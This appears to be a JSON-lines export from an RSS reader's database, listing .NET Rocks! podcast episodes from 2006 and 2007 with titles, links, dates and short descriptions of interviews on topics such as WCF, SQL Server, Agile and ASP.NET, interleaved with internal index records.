{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=222","title":"Michele Leroux Bustamante on WCF","published":{"$wrap":"$date","v":1174568171000,"h":"2007-03-22T12:56:11.000Z"},"starred":false,"read":false,"content":"Michele checks in with Carl and Richard on the state of WCF. Not to be missed!","author":false,"_id":{"$wrap":"$oid","v":670}}
{"k":"0000000082","o":"0000000496","v":"001"}
{"_id":671,"_uid":671,"_dt":1373728934236,"_s":"ff551ffeb8840022433f9ab309521b9a"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=221","title":"Kate Gregory on Managed C++, Vista Security, and more","published":{"$wrap":"$date","v":1174363200000,"h":"2007-03-20T04:00:00.000Z"},"starred":false,"read":false,"content":"The always brilliant and delightful Kate Gregory talks with Carl and Richard about her passion, which is managed C++, as well as Vista, UAC and other things geekish.","author":false,"_id":{"$wrap":"$oid","v":671}}
{"k":"0000000082","o":"0000000519","v":"001"}
{"_id":672,"_uid":672,"_dt":1373728934236,"_s":"ef6cfefe24cb81cf14abc7202676fd2e"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=220","title":"Jack Greenfield on Software Factories","published":{"$wrap":"$date","v":1173931654000,"h":"2007-03-15T04:07:34.000Z"},"starred":false,"read":false,"content":"Jack Greenfield talks about software factories, or software that builds software. The conceptual and practical aspects of the future of software development, and implications for developers are discussed.","author":false,"_id":{"$wrap":"$oid","v":672}}
{"k":"0000000082","o":"0000000574","v":"001"}
{"_id":673,"_uid":673,"_dt":1373728934237,"_s":"1987d195712e39cc035dc56ba4665cf7"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=219","title":"Shaun Walker on DotNetNuke 4.x","published":{"$wrap":"$date","v":1173758400000,"h":"2007-03-13T04:00:00.000Z"},"starred":false,"read":false,"content":"Shaun Walker is back to talk about advances in DotNetNuke, his incredible open-source ASP.NET framework. .NET Nuke has been an increasingly popular option for development of ASP.NET sites and applications ever since it arrived on the scene in the early days of .NET.","author":false,"_id":{"$wrap":"$oid","v":673}}
{"k":"0000000082","o":"0000000491","v":"001"}
{"_id":674,"_uid":674,"_dt":1373728934238,"_s":"b1ac5edc206c2b2b93aa3082bf42d350"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=218","title":"Dare Obasanjo on Windows Live Services and Other Cool Projects","published":{"$wrap":"$date","v":1173339044000,"h":"2007-03-08T07:30:44.000Z"},"starred":false,"read":false,"content":"Dare Obasanjo talks to us about his work with Windows Live Server technologies, Windows Live Messenger, and RSS Bandit, his open source RSS aggregator.","author":false,"_id":{"$wrap":"$oid","v":674}}
{"k":"0000000082","o":"0000000608","v":"001"}
{"_id":675,"_uid":675,"_dt":1373728934238,"_s":"a2f184402b22e5d5ef540e6d87b3ba65"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=217","title":"Paul Randal on SQL Server 2005 Performance and Recovery","published":{"$wrap":"$date","v":1173167043000,"h":"2007-03-06T07:44:03.000Z"},"starred":false,"read":false,"content":"Microsoftee Paul Randal drops by for an engaging talk about his contributions to the recoverability of SQL Server 2005, which are many (Can you say CHECKDB?). An old friend of ours, and a fairly new friend if Paul's, busts in on the conversation and makes a cameo appearance.","author":false,"_id":{"$wrap":"$oid","v":675}}
{"k":"0000000082","o":"0000000601","v":"001"}
{"_id":676,"_uid":676,"_dt":1373728934239,"_s":"db7a204b5ba0a36f4db059761b42828d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=216","title":"Eric Sink on Vista, Writing Books, SourceGear, and Wii Golf","published":{"$wrap":"$date","v":1172574600000,"h":"2007-02-27T11:10:00.000Z"},"starred":false,"read":false,"content":"Eric Sink talks to us this week about a number of things currently on his mind including software methodologies, getting involved in the business side of software, upgrading to Vista, WPF/E, writing books for a living, and the evolution of his product, SourceGear.","author":false,"_id":{"$wrap":"$oid","v":676}}
{"k":"0000000082","o":"0000000435","v":"001"}
{"_id":677,"_uid":677,"_dt":1373728934240,"_s":"b5a72a0c4599f54188b78b071df75566"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=215","title":"Steve McConnell Makes Sure We're Code Complete","published":{"$wrap":"$date","v":1171940011000,"h":"2007-02-20T02:53:31.000Z"},"starred":false,"read":false,"content":"Steve McConnell talks about his books, and his take on programming practices that transcend specific languages.","author":false,"_id":{"$wrap":"$oid","v":677}}
{"k":"0000000082","o":"0000000571","v":"001"}
{"_id":678,"_uid":678,"_dt":1373728934241,"_s":"6337c661ebf0ced965a83a2a94808a04"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=214","title":"Billy Hollis on Application Complexity","published":{"$wrap":"$date","v":1171355757000,"h":"2007-02-13T08:35:57.000Z"},"starred":false,"read":false,"content":"In this episode, Billy Hollis talks about the finer points of developing complex applications in the real world, the true costs and benefits of agile and other methodologies, and the things programmers and organizations can do to be effecient financially.","author":false,"_id":{"$wrap":"$oid","v":678}}
{"k":"0000000082","o":"0000000506","v":"001"}
{"_id":679,"_uid":679,"_dt":1373728934242,"_s":"913c6883a5d9191ffc3f4ca855783132"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=213","title":"Jesse Liberty and Alex Horovitz on .NET 3.0","published":{"$wrap":"$date","v":1170747155000,"h":"2007-02-06T07:32:35.000Z"},"starred":false,"read":false,"content":"Jesse Liberty and Alex Horovitz talk about their experiences researching and writing their book, Programming .NET 3.0 from O'Reilly, as well as their ideas on the future of programming.","author":false,"_id":{"$wrap":"$oid","v":679}}
{"k":"0000000082","o":"0000000554","v":"001"}
{"_id":680,"_uid":680,"_dt":1373728934242,"_s":"6f6ae094787bb4145294cb0936bb693e"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=212","title":"Allan Hirt on High Availability","published":{"$wrap":"$date","v":1170144393000,"h":"2007-01-30T08:06:33.000Z"},"starred":false,"read":false,"content":"Allan Hirt discusses the details of providing high availability with SQL Server 2005, and the things developers need to know in order to make their applications compatable.  He discusses clustering, transaction log shipping, mirroring, and more.","author":false,"_id":{"$wrap":"$oid","v":680}}
{"k":"0000000082","o":"0000000543","v":"001"}
{"_id":681,"_uid":681,"_dt":1373728934243,"_s":"07522f59209c922657b85b33ad5e7943"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=211","title":"Raymond Chen on Raymond Chen","published":{"$wrap":"$date","v":1169546525000,"h":"2007-01-23T10:02:05.000Z"},"starred":false,"read":false,"content":"In this interview, Raymond Chen discusses... Raymond Chen!  Raymond talks about his history at Microsoft dating back to the early days of the Windows32 API, up through the recent release of Windows Vista and whatever else is on his mind.","author":false,"_id":{"$wrap":"$oid","v":681}}
{"k":"0000000082","o":"0000000570","v":"001"}
{"_id":682,"_uid":682,"_dt":1373728934244,"_s":"80a3963da6af7a770b51b9761ecffbd9"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=210","title":"Scott Ambler on Agile","published":{"$wrap":"$date","v":1168920000000,"h":"2007-01-16T04:00:00.000Z"},"starred":false,"read":false,"content":"Agile Methodology is a wide topic, and this discussion is quite unlike the others that we've had. Scott Ambler brings his experiences from his career at IBM and elsewhere to this lively discussion. Richard was particularly interested in his ideas on database refactoring.","author":false,"_id":{"$wrap":"$oid","v":682}}
{"k":"0000000082","o":"0000000680","v":"001"}
{"_id":683,"_uid":683,"_dt":1373728934244,"_s":"4a0f69fb3799a86b397689ada639a967"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=209","title":"Mark Dunn and Mark Berry on Biztalk 2006","published":{"$wrap":"$date","v":1168323111000,"h":"2007-01-09T06:11:51.000Z"},"starred":false,"read":false,"content":"Mark Berry and Mark Dunn from DUNN Training join us this week to dig a little deeper into BizTalk Server 2006.  In this gripping sequel to Mark's earlier BizTalk shows, we delved much deeper into the inner workings of BizTalk than we've ever gone before.  These guys know their stuff and you can bet this show will be educational and even a wee bit entertaining.","author":false,"_id":{"$wrap":"$oid","v":683}}
{"k":"0000000082","o":"0000000459","v":"001"}
{"_id":684,"_uid":684,"_dt":1373728934245,"_s":"907d0cc11462b1b4104662c48d1aa448"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=208","title":"Scott Guthrie Looks Ahead","published":{"$wrap":"$date","v":1167724016000,"h":"2007-01-02T07:46:56.000Z"},"starred":false,"read":false,"content":"ASP.NET Co-creator Scott Guthrie talks about the present state and the future of ASP.NET, and also touches on WPFE, the Expression suite, and Windows Vista.","author":false,"_id":{"$wrap":"$oid","v":684}}
{"k":"0000000082","o":"0000000739","v":"001"}
{"_id":685,"_uid":685,"_dt":1373728934246,"_s":"3626be5be90969a0d11b99c946ec8089"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=207","title":"Live from the Canadian Vista Launch Events!","published":{"$wrap":"$date","v":1166514479000,"h":"2006-12-19T07:47:59.000Z"},"starred":false,"read":false,"content":"Carl and Richard were the emcees at the Toronto, Montreal, and Ottawa launch events in December, 2006. They were hired to generate excitement and give away swag! What a gig! Along the way they got to talk to some of the attendees and locals in the community. Great stuff!  Featuring the following guests:  Shane Miskin, Scott Howlett, Allan Vander-spek, Mohammad Akif, Robert Achmann, Jean-Luc David, and Tony Davidson","author":false,"_id":{"$wrap":"$oid","v":685}}
{"k":"0000000082","o":"0000000550","v":"001"}
{"_id":686,"_uid":686,"_dt":1373728934247,"_s":"9d6c448cff6994af4f81d177231a7b9b"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=206","title":"Ted Neward on Interoperability","published":{"$wrap":"$date","v":1165896849000,"h":"2006-12-12T04:14:09.000Z"},"starred":false,"read":false,"content":"Ted Neward discusses the present state and future of interoperability.  Java and .NET compatability are disucssed, Ted touches on a wide range of topics ranging from XML's shortcomings as a messenger format to proprietary systems in .NET 3.0.","author":false,"_id":{"$wrap":"$oid","v":686}}
{"k":"0000000082","o":"0000000559","v":"001"}
{"_id":687,"_uid":687,"_dt":1373728934247,"_s":"10ff5ab1200c35e14afd6b23ec9ce9ec"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=205","title":"Venkat Subramaniam and Andrew Hunt Talk Agile","published":{"$wrap":"$date","v":1165318281000,"h":"2006-12-05T11:31:21.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk with Venkat Subramaniam, who has had a string of successful dnrTV episodes, and Andrew Hunt about Agile dos and don'ts. Agile Methodology can be overwhelming, and these guys introduce a much-needed dose of reality.","author":false,"_id":{"$wrap":"$oid","v":687}}
{"k":"0000000082","o":"0000000399","v":"001"}
{"_id":688,"_uid":688,"_dt":1373728934248,"_s":"25d8e796e985f301328a229408246de1"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=204","title":"TechEd Europe Interviews","published":{"$wrap":"$date","v":1164761983000,"h":"2006-11-29T00:59:43.000Z"},"starred":false,"read":false,"content":"Carl and Richard interview speakers and special guests at Tech Ed: Developer in Barcelona, Spain.","author":false,"_id":{"$wrap":"$oid","v":688}}
{"k":"0000000082","o":"0000000524","v":"001"}
{"_id":689,"_uid":689,"_dt":1373728934249,"_s":"2accc9ac44f33a937794a61725ad7a47"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=203","title":"Bill Wagner and Diane Marsh on Non-MS Technology","published":{"$wrap":"$date","v":1164088347000,"h":"2006-11-21T05:52:27.000Z"},"starred":false,"read":false,"content":"The discussion this week is on what .NET developers can learn by working with non-MS technology. Our guests' experience with technology includes .NET as well as non-Microsoft development technology.","author":false,"_id":{"$wrap":"$oid","v":689}}
{"k":"0000000082","o":"0000000474","v":"001"}
{"_id":690,"_uid":690,"_dt":1373728934249,"_s":"f7b22d2a71abb9ea4e0ea318b2b7e643"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=202","title":"TechEd Europe Agile Panel","published":{"$wrap":"$date","v":1163476800000,"h":"2006-11-14T04:00:00.000Z"},"starred":false,"read":false,"content":"Kate Gregory, Stephen Forte, and Roy Osherove join Richard Campbell and Carl Franklin on stage at TechEd Europe in Barcelona for this discussion about Agile methodologies.","author":false,"_id":{"$wrap":"$oid","v":690}}
{"k":"0000000082","o":"0000000393","v":"001"}
{"_id":691,"_uid":691,"_dt":1373728934250,"_s":"a90ed4edcb3953ec3928825d65672b46"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=201","title":"Live from Tulsa Tech Fest 2006","published":{"$wrap":"$date","v":1162958400000,"h":"2006-11-08T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard interview a number of speakers and staff at the Tulsa TechFest 2006.","author":false,"_id":{"$wrap":"$oid","v":691}}
{"k":"0000000082","o":"0000000564","v":"001"}
{"_id":692,"_uid":692,"_dt":1373728934251,"_s":"9e0c252b850714966c7e66bcad2a3697"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=200","title":"The 200th Episode Quiz Show!","published":{"$wrap":"$date","v":1162267200000,"h":"2006-10-31T04:00:00.000Z"},"starred":false,"read":false,"content":"We cover a lot of entertaining ground on this landmark episode.  Carl treats us to a live performance as well as a preview of a remake of a classic.  We quiz the previous DNR co-hosts and give out a bunch of free swag!  Also, Mark Miller acts a bit confused.","author":false,"_id":{"$wrap":"$oid","v":692}}
{"k":"0000000082","o":"0000000495","v":"001"}
{"_id":693,"_uid":693,"_dt":1373728934251,"_s":"b392d6ffd63e2934bab7d24ae59a835b"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=199","title":"Josh Holmes on SQL Everywhere and More","published":{"$wrap":"$date","v":1161673269000,"h":"2006-10-24T07:01:09.000Z"},"starred":false,"read":false,"content":"Josh talks with Carl and Richard about SQL Everywhere, Windows Vista, and the Visual Studio Class Designer, as well as his new role at Microsoft as a Breadth Architect Evangelist.","author":false,"_id":{"$wrap":"$oid","v":693}}
{"k":"0000000082","o":"0000000463","v":"001"}
{"_id":694,"_uid":694,"_dt":1373728934252,"_s":"7fc6a50c7275ccdead96ccb2b820f1fa"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=198","title":"Live from Bulgaria!","published":{"$wrap":"$date","v":1161051897000,"h":"2006-10-17T02:24:57.000Z"},"starred":false,"read":false,"content":"Carl and Richard were in Sofia, Bulgaria at the very first DevReach conference last week. A lively panel discussion is accented with short interviews with the locals.","author":false,"_id":{"$wrap":"$oid","v":694}}
{"k":"0000000082","o":"0000000561","v":"001"}
{"_id":695,"_uid":695,"_dt":1373728934253,"_s":"c22a2c0dd46ebf109f394fef3601b2b4"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=197","title":"Johnathan Zuck on IP law, Congress, and Patents","published":{"$wrap":"$date","v":1160452800000,"h":"2006-10-10T04:00:00.000Z"},"starred":false,"read":false,"content":"In this episode of Dot Net Rocks, one of our earliest guests returns to talk about the power of (and problems with) the patent process, and the growing complexity of intellectual properly law in the Enited States, Europe, and the world.","author":false,"_id":{"$wrap":"$oid","v":695}}
{"k":"0000000082","o":"0000000420","v":"001"}
{"_id":696,"_uid":696,"_dt":1373728934253,"_s":"316fe167891ec58617aa1fd8aeebab5d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=196","title":"Rob Conery on Subsonic","published":{"$wrap":"$date","v":1159761600000,"h":"2006-10-02T04:00:00.000Z"},"starred":false,"read":false,"content":"Rob Conery talks about the appeal of Ruby on Rails and Subsonic, his ASP.NET productivity tool with Rails-like features.","author":false,"_id":{"$wrap":"$oid","v":696}}
{"k":"0000000082","o":"0000000444","v":"001"}
{"_id":697,"_uid":697,"_dt":1373728934254,"_s":"818ee1581cdca252f52d122dd93c57bd"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=195","title":"Roy Osherove on Regular Expressions","published":{"$wrap":"$date","v":1159243200000,"h":"2006-09-26T04:00:00.000Z"},"starred":false,"read":false,"content":"Roy Osherove opens our minds to the power of RegEx includign a succinct audio RegEx tutorial! When it comes to RegEx Roy is da man!","author":false,"_id":{"$wrap":"$oid","v":697}}
{"k":"0000000082","o":"0000000426","v":"001"}
{"_id":698,"_uid":698,"_dt":1373728934255,"_s":"3ffcce539ba669e1d161126a5152b6d9"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=194","title":"Huihong Luo on Obfuscation and Decompiling","published":{"$wrap":"$date","v":1158634495000,"h":"2006-09-19T02:54:55.000Z"},"starred":false,"read":false,"content":"Dr. Huihong Luo discusses techniques of Obfuscation and decompiling used in his Salamander Suite of tools.","author":false,"_id":{"$wrap":"$oid","v":698}}
{"k":"0000000082","o":"0000000422","v":"001"}
{"_id":699,"_uid":699,"_dt":1373728934255,"_s":"531dfe4c901c74b1b2091e08709bb56f"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=193","title":"Joel Semeniuk Updates Us on Team System","published":{"$wrap":"$date","v":1158033600000,"h":"2006-09-12T04:00:00.000Z"},"starred":false,"read":false,"content":"Joel Semeniuk is back with a report on the state of Visual Studio Team System and Team Foundation Server.","author":false,"_id":{"$wrap":"$oid","v":699}}
{"k":"0000000082","o":"0000000469","v":"001"}
{"_id":700,"_uid":700,"_dt":1373728934256,"_s":"c8fb344265c48d4f02585f82d61cf810"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=192","title":"Lunch with Forte!","published":{"$wrap":"$date","v":1157442333000,"h":"2006-09-05T07:45:33.000Z"},"starred":false,"read":false,"content":"Carl goes to New York City to have Pizza and conversation with Stephen Forte. When it comes to what bugs him about this business, Steve pulls no punches. Hey! Fahgeddabahdit!","author":false,"_id":{"$wrap":"$oid","v":700}}
{"k":"0000000082","o":"0000000498","v":"001"}
{"_id":701,"_uid":701,"_dt":1373728934257,"_s":"cf106361b194012be1d41cfed69b053d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=191","title":"Jimmy Nilsson on Domain Driven Design","published":{"$wrap":"$date","v":1156824000000,"h":"2006-08-29T04:00:00.000Z"},"starred":false,"read":false,"content":"In this episode, Jimmy Nillson gets into Domain Driven Design, and how it relates to Test Driven Development, extreme programming, and the future of programming techniques in general.","author":false,"_id":{"$wrap":"$oid","v":701}}
{"k":"0000000082","o":"0000000456","v":"001"}
{"_id":702,"_uid":702,"_dt":1373728934257,"_s":"fe4ce162d102fc17b0972c1728b30bd2"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=190","title":"Robert Scoble: Life After Microsoft","published":{"$wrap":"$date","v":1156219910000,"h":"2006-08-22T04:11:50.000Z"},"starred":false,"read":false,"content":"Carl and Richard catch up with Robert Scoble. He's got some choice words about Microsoft, blogging, podcasting, the future, and his new career.","author":false,"_id":{"$wrap":"$oid","v":702}}
{"k":"0000000082","o":"0000000451","v":"001"}
{"_id":703,"_uid":703,"_dt":1373728934258,"_s":"113350dea60a63756976841240dcbbfb"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=189","title":"Ted Pattison Shows us Sharepoint","published":{"$wrap":"$date","v":1155528000000,"h":"2006-08-14T04:00:00.000Z"},"starred":false,"read":false,"content":"Ted Pattison brings us up to date on Sharepoint technologies including Sharepoint Services 3.0 and MOSS (Microsoft Office Sharepoint Server).","author":false,"_id":{"$wrap":"$oid","v":703}}
{"k":"0000000082","o":"0000000616","v":"001"}
{"_id":704,"_uid":704,"_dt":1373728934259,"_s":"5d70b984e7f6ddfb2627689f26459e6d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=188","title":"Showdown! Mary Jo Foley vs. Darryl Taft","published":{"$wrap":"$date","v":1155009600000,"h":"2006-08-08T04:00:00.000Z"},"starred":false,"read":false,"content":"Noted journalists Mary Jo Foley and Darryl K Taft on loan from eWeek magazine are in the studio in a head to head discussion around topical issues concerning Microsoft. The gloves come off and they don't stop until there's carnage on the floor! OK, it's not that ugly, but you won't want to miss it.","author":false,"_id":{"$wrap":"$oid","v":704}}
{"k":"0000000082","o":"0000000393","v":"001"}
{"_id":705,"_uid":705,"_dt":1373728934260,"_s":"1222510a027d820fa036c83b8e0945c2"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=187","title":"Miguel Castro on Web Controls 2.0","published":{"$wrap":"$date","v":1154404800000,"h":"2006-08-01T04:00:00.000Z"},"starred":false,"read":false,"content":"In this episode, Miguel Castro talks about what's new in Web Controls in .NET 2.0.","author":false,"_id":{"$wrap":"$oid","v":705}}
{"k":"0000000082","o":"0000000452","v":"001"}
{"_id":706,"_uid":706,"_dt":1373728934260,"_s":"6b674496b8e37c7650613407daa3167e"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=186","title":"Introducing Information Center","published":{"$wrap":"$date","v":1153800000000,"h":"2006-07-25T04:00:00.000Z"},"starred":false,"read":false,"content":"In this episode, Marc Mercuri goes into some great detail about a new RSS aggregator, Information Center, and the future of content aggregation.","author":false,"_id":{"$wrap":"$oid","v":706}}
{"k":"0000000082","o":"0000000503","v":"001"}
{"_id":707,"_uid":707,"_dt":1373728934261,"_s":"9a7e0efff6c4364cf073a55455d06c02"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=185","title":"Mark Miller on Discoverability","published":{"$wrap":"$date","v":1153195200000,"h":"2006-07-18T04:00:00.000Z"},"starred":false,"read":false,"content":"In this unusual episode, Rory Blyth co-hosts, and interviews Mark Miller, who talks about discoverability, code rush, and a bunch of other stuff that may take teams of scientists years to decode!","author":false,"_id":{"$wrap":"$oid","v":707}}
{"k":"0000000082","o":"0000000490","v":"001"}
{"_id":708,"_uid":708,"_dt":1373728934262,"_s":"8e6b64d7e2d204f135a54a15c09b63eb"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=184","title":"Jon Rauschenberger on VB6/Windows Forms Interop","published":{"$wrap":"$date","v":1152590400000,"h":"2006-07-11T04:00:00.000Z"},"starred":false,"read":false,"content":"Chicago Regional Director Jon Rauschenberger shares his secrets for converting VB6 applications to .NET using a toolkit that he helped the Microsoft VB team develop.","author":false,"_id":{"$wrap":"$oid","v":708}}
{"k":"0000000082","o":"0000000508","v":"001"}
{"_id":709,"_uid":709,"_dt":1373728934263,"_s":"4ee8cf89ac536284abe25522aacabe00"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=183","title":"Interviews at Fenway Park TechEd 2006","published":{"$wrap":"$date","v":1151985600000,"h":"2006-07-04T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl walks around with his trusty portable and interviews people after the Teched 2006 conference in Boston.  Many great topics are covered, both about the conference and about .NET in general.","author":false,"_id":{"$wrap":"$oid","v":709}}
{"k":"0000000082","o":"0000000430","v":"001"}
{"_id":710,"_uid":710,"_dt":1373728934263,"_s":"364e603564abe06778ae9bcbafd66b38"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=182","title":"Dan Ciruli on Grid Computing","published":{"$wrap":"$date","v":1151294400000,"h":"2006-06-26T04:00:00.000Z"},"starred":false,"read":false,"content":"Dan Ciruli talks about the Digipede Network, a framework for grid computing with the .NET Framework on the Windows platform.","author":false,"_id":{"$wrap":"$oid","v":710}}
{"k":"0000000082","o":"0000000654","v":"001"}
{"_id":711,"_uid":711,"_dt":1373728934264,"_s":"f62803f9bfede2803e859b622c10e252"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=181","title":"Cameron Skinner and Gert Drapers on DataDude","published":{"$wrap":"$date","v":1150776000000,"h":"2006-06-20T04:00:00.000Z"},"starred":false,"read":false,"content":"DataDude is the code name for Microsoft Visual Studio Team System for Database Professionals, announced shortly before TechEd in June, 2006. Carl and Richard interviewed Cameron Skinner and Gert Drapers from the DataDude team on June 12th at TechEd, in this somewhat shorter-than-usual but very informative live .NET Rocks! episode.","author":false,"_id":{"$wrap":"$oid","v":711}}
{"k":"0000000082","o":"0000000427","v":"001"}
{"_id":712,"_uid":712,"_dt":1373728934265,"_s":"430987b9e2e3bf4330406fb1a48835ad"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=180","title":"Michael Stiefel gets us into the Windows Workflow","published":{"$wrap":"$date","v":1150171200000,"h":"2006-06-13T04:00:00.000Z"},"starred":false,"read":false,"content":"Michael Stiefel talks to us about what the Windows Workflow Foundation is and why we want to use it.","author":false,"_id":{"$wrap":"$oid","v":712}}
{"k":"0000000082","o":"0000000533","v":"001"}
{"_id":713,"_uid":713,"_dt":1373728934266,"_s":"8b8f4c3dd1db4bff61cd3f3471092130"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=179","title":"Brian Randell Checks in on Virtualization","published":{"$wrap":"$date","v":1149566400000,"h":"2006-06-06T04:00:00.000Z"},"starred":false,"read":false,"content":"Brian Randell talks about Virtual Machines today and tomorrow, and boasts a bit about his new monster of a machine. The discussion also touches on the rift between Microsoft and Adobe over PDF support in Office 12.","author":false,"_id":{"$wrap":"$oid","v":713}}
{"k":"0000000082","o":"0000000492","v":"001"}
{"_id":714,"_uid":714,"_dt":1373728934266,"_s":"7100f2fbeaf6d0d56db51d95bead94f5"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=178","title":"Kimberly Tripp on SQL 2005 SP1 and more","published":{"$wrap":"$date","v":1148875200000,"h":"2006-05-29T04:00:00.000Z"},"starred":false,"read":false,"content":"In this episode, the always mind-bending Kimberly Tripp talks to us about improvements in SQL Server 2005 Service Pack 1, converting Oracle users to SQL server, and much more.","author":false,"_id":{"$wrap":"$oid","v":714}}
{"k":"0000000082","o":"0000000582","v":"001"}
{"_id":715,"_uid":715,"_dt":1373728934267,"_s":"519565fcdc11d89fabd0afb88320cee3"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=177","title":"Live at SDC, The Netherlands!","published":{"$wrap":"$date","v":1148356800000,"h":"2006-05-23T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard were at the Software Developer Network Conference in Arnhem, The Netherlands last week. They took the portable rig and captured some memorable momemnts with attendees, speakers, and staff. You'll recognize most of the speakers as previous guests on the show.","author":false,"_id":{"$wrap":"$oid","v":715}}
{"k":"0000000082","o":"0000000607","v":"001"}
{"_id":716,"_uid":716,"_dt":1373728934268,"_s":"0807b1bb3a43bb6e3842d08a6c7affab"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=176","title":"Michele Leroux Bustamante Gets Hard on Indigo","published":{"$wrap":"$date","v":1147752000000,"h":"2006-05-16T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richad talk to MLB about the state of Windows Communication Foundation (code name: Indigo). If you are designing a webservices-based (or distributed) system now, you should be using WCF. Michele also talks about SOA reality, and of course ends the show with a signature joke.","author":false,"_id":{"$wrap":"$oid","v":716}}
{"k":"0000000082","o":"0000000480","v":"001"}
{"_id":717,"_uid":717,"_dt":1373728934269,"_s":"d7ccff2b53b696facee1ed22dc0df245"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=175","title":"Ted Neward on Project Automation","published":{"$wrap":"$date","v":1147147200000,"h":"2006-05-09T04:00:00.000Z"},"starred":false,"read":false,"content":"Ted Neward makes a rallying call for developers to do everything they can to automate software development, from Continuous Integration to automatic testing and feedback.","author":false,"_id":{"$wrap":"$oid","v":717}}
{"k":"0000000082","o":"0000000574","v":"001"}
{"_id":718,"_uid":718,"_dt":1373728934270,"_s":"ce49370895de23512586b257ba094f51"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=174","title":"Kent Alstad on ATLAS","published":{"$wrap":"$date","v":1146546058000,"h":"2006-05-02T05:00:58.000Z"},"starred":false,"read":false,"content":"Kent Alstad gives you the low-down on ATLAS, Microsoft's nascent framework for developing AJAX-enabled ASP.NET applications. This show also marks the announcement of a new web appliance product that will no-doubt revolutionize the way websites deal with scalability and state.","author":false,"_id":{"$wrap":"$oid","v":718}}
{"k":"0000000082","o":"0000000419","v":"001"}
